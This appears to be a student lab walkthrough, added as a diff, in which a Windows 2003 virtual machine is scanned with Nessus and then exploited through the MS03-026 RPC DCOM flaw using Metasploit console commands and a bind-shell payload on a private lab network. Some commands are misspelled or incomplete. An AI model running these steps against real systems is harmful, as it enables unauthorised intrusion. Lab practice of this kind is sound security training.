@@ -1,0 +1,45 @@
+1. 02 virtual machines
+	1. windows xp-(source pc)
+		
+	2. windows 2003-(destination pc)
+	   * vulnerabile computer which i have choosen for exploit
+
+**using ifconfig command to see the above ip
+ 	1. windows xp-(source pc)
+		ip address-192.168.100.66
+
+	2. windows 2003-(destination pc)
+		ip address-192.168.100.1
+
+**Open NESSUS4 in source pc click on scan > enter the ip address of destination pc(192.168.100.1)
+then select a scan policy as New policy
+after that click on Connect
+finally click on Scan Now
+
+after finishing scan click on Report to see the reports /vulnerabilities
+then search for the vulnerability / exploitation which i have to use
+
+**open metasploit in start menu > MSF Console 
+then type in console show exploits to see the exploit and see our selected vulnerability
+**msf > show exploits
+
+see the information of exploitation
+**msf > info msrpc_dcom_ms03_026
+
+Now I will check the payload info of my selected win32-bind 
+**msf > use msrpc_dcom_ns03_026   and then type as
+**msf msrpc_dcom_ns03_026(win32_bind) > info win32_bind
+
+Now I will set the RHOST & RPORT given below 
+**msf msrpc_dcom_ns03_026(win32_bind) > set RHOST 192.168.100.1
+**msf msrpc_dcom_ns03_026(win32_bind) > RPORT 135
+
+ to see the above are set successfully
+**msf msrpc_dcom_ns03_026(win32_bind) > show options
+
+
+HERE I have issued the command as exploit it will exploit the target using the vulnerability 
+**msf msrpc_dcom_ns03_026(win32_bind) > exploit
+
+after the successful connection of 192.168.100.66 to 192.168.100.1
+the command prompt will notify that it went to windows computer(windows 2003)
